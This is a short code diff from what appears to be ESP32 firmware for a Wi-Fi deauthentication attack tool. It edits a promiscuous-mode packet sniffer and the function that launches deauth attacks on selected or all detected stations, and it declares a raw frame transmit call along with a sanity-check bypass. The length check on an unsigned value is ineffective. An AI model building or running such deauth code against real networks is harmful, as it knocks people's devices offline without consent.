@@ -16,11 +16,11 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
-  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
-  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
-  const mac_hdr_t *mac_header = &packet->hdr;
+  wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
+  wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
+  mac_hdr_t *mac_header = &packet->hdr;
 
-  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+  uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
 
   if (packet_length < 0) return;
 
@@ -82,7 +82,6 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
     
     if (wifi_numbers.size() > 1)  {
       bool isInitialized = false;
-      WiFi.softAPdisconnect();
       while (!isBootButtonPressed_interrupt()) { 
         for (int wifi_number : wifi_numbers) {
           if (wifi_number >= 0) {
@@ -106,7 +105,7 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
 
   } else if (deauth_type == DEAUTH_TYPE_ALL) {
     DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
-    WiFi.softAPdisconnect();
+    WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_MODE_STA);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_filter(&filt);
